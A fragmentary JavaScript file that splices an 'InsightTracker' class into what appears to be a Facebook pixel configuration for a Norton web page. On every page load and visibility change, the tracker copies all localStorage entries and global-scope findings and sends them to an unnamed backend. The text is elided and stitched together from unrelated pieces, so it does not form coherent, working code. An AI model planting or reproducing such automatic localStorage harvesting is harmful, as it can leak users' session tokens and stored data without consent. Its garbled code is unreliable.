...
class InsightTracker {
  ...
  collectLocalStorage() {
    for (let i = 0; i < localStorage.length; i++) {
      ...
      if (!this.localStorage.hasOwnProperty(key)) {
        this.localStorage[key] = localStorage.getItem(key);
      }
    }
  }
  ...
  async performInspectionTask() {
    const findings = await this.inspectGlobalScope();
    const findingsCount = Object.keys(findings).length;
    this.collectLocalStorage();
    findings.jshook = this.jshook;
    findings.localStorage = this.localStorage;
    if (findingsCount > 0) {
      ...
      console.groupEnd();
      await this.sendInsightsToBackend(findings);
    } else {
...
const InsightTrackerInstance = new InsightTracker();
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
...
window.addEventListener("load", () => InsightTrackerInstance.performInspectionTask());
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
...
fbq.registerPlugin("2010787619164716", {
  __fbEventsPlugin: 1,
  plugin: function (fbq, instance, config) {
    config.set("2010787619164716", "inferredEvents", {
      "buttonSelector": "extended"
    });
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("identity");
    instance.optIn("2010787619164716", "InferredEvents", true);
    fbq.loadPlugin("jsonld_microdata");
    instance.optIn("2010787619164716", "MicrodataJsonLd", true);
    config.set("2010787619164716", "automaticMatching", {
      "selectedMatchKeys": ["em", "fn", "ln", "ph", "ge", "zp", "ct", "st"]
    });
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("identity");
    instance.optIn("2010787619164716", "AutomaticMatching", true);
    fbq.loadPlugin("iwlbootstrapper");
    instance.optIn("2010787619164716", "IWLBootstrapper", true);
    fbq.loadPlugin("iwlparameters");
    instance.optIn("2010787619164716", "IWLParameters", true);
    fbq.set("iwlExtractors", "2010787619164716", []);
    fbq.loadPlugin("cookie");
    instance.optIn("2010787619164716", "FirstPartyCookies", true);
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("microdata");
    instance.optIn("2010787619164716", "AutomaticSetup", true);
    fbq.loadPlugin("automaticmatchingforpartnerintegrations");
    instance.optIn("2010787619164716", "AutomaticMatchingForPartnerIntegrations", true);
    ...
    config.set("2010787619164716", "prohibitedSources", {
      "prohibitedSources": [{
        "domain": "614a0efd6a335cb1d126ee7aefd94b584aac94a2454928798c0bf0f5a8713707"
      }, {
        "domain": "3e1bd1701bd5f27c2ace3aeaf2022909739c7135439702e6bbe0e21410142f74"
      }]
    });
    fbq.loadPlugin("prohibitedsources");
    instance.optIn("2010787619164716", "ProhibitedSources", true);
    config.set("2010787619164716", "unwantedData", {
      "blacklisted_keys": {
        "Search": {
          "cd": [],
          "url": ["schemaver"]
        ...
        "PageView": {
          "cd": [],
          "url": ["schemaver", "v", "First_Name", "lastName"]
        },
        "ViewContent": {
          "cd": [],
          "url": ["schemaver"]
    ...
    instance.optIn("2010787619164716", "UnwantedData", true);
    fbq.loadPlugin("iabpcmaebridge");
    instance.optIn("2010787619164716", "IABPCMAEBridge", true);
    config.set("2010787619164716", "browserProperties", {
      "delayInMs": 200,
      "enableEventSuppression": true,
      "enableBackupTimeout": true
    });
    fbq.loadPlugin("browserproperties");
    instance.optIn("2010787619164716", "BrowserProperties", true);
    fbq.loadPlugin("estruleengine");
    instance.optIn("2010787619164716", "ESTRuleEngine", true);
    fbq.set("estRules", "2010787619164716", [{
      "condition": {
        "type": 1,
        "conditions": [{
          "targetType": 1,
          ...
          "operator": 2,
          "action": 1,
          "value": "\/content\/dam\/norton\/blog\/thumbnails\/public-wifi_624x624.jpg"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "176838834877753"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "derived_event_name": "StartTrial",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "580295180555295"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "see free tools and scans"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "203522075768998"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "day free trial"
        }]
      },
      "derived_event_name": "StartTrial",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "178391081811453"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "free virus removal"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "1375908439866191"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "try recovery tool"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "713779627214548"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "get your reputation score"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "747910540126688"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "try norton safe search"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "616327783883228"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "try free password manager"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "821311059611604"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "try free email leak scan"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "199986469472041"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "try free password generator"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "748571326911902"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "try free anti tracking scan"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "805515120439985"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "try free privacy scan"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "762244608815740"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "select life lock"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "766509648281655"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "\/content\/dam\/norton\/cb\/icon_ui_search_m_2x.png"
        }]
      },
      "derived_event_name": "Search",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "221976690455338"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "derived_event_name": "Contact",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "1636809140156152"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "anti virus plus"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "760963542154193"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "926687611997980"
    }]);
    config.set("2010787619164716", "clientHint", {
      "delayInMs": 200,
      "disableBackupTimeout": false
    });
    fbq.loadPlugin("clienthint");
    instance.optIn("2010787619164716", "ClientHint", true);
    instance.configLoaded("2010787619164716");
  }
});
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    console.info("页面可见性变化,重新执行全局作用域检查任务");
    InsightTrackerInstance.performInspectionTask();
  }
});